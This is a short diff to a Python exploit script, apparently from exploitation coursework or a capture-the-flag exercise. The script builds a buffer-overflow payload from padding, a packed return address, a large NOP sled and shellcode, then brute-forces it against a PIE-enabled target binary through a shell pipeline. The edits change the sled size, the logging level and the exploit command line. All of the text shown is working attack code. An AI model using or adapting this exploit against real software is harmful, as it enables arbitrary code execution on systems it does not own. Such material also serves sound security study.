@@ -220,7 +220,7 @@ def construct_payload(offset, target):
 
     payload = b'A' * offset
     payload += struct.pack("<I", middle)
-    payload += b'\x90' * 130000
+    payload += b'\x90' * 129000
     payload += shellcode
 
     open("payload", "wb").write(payload)
@@ -319,7 +319,7 @@ def main():
     # Extract arguments
     target = args.target
 
-    # context.log_level='warn'
+    context.log_level='warn'
     # context.log_level = 'debug'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
@@ -330,7 +330,7 @@ def main():
 
     #performing brute force attack
     # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
-    exploit_command = f"cat payload - | {target} `cat payload`"
+    exploit_command = f"cat payload - | {target} -c `cat payload`"
 
     i = 0
     while True:
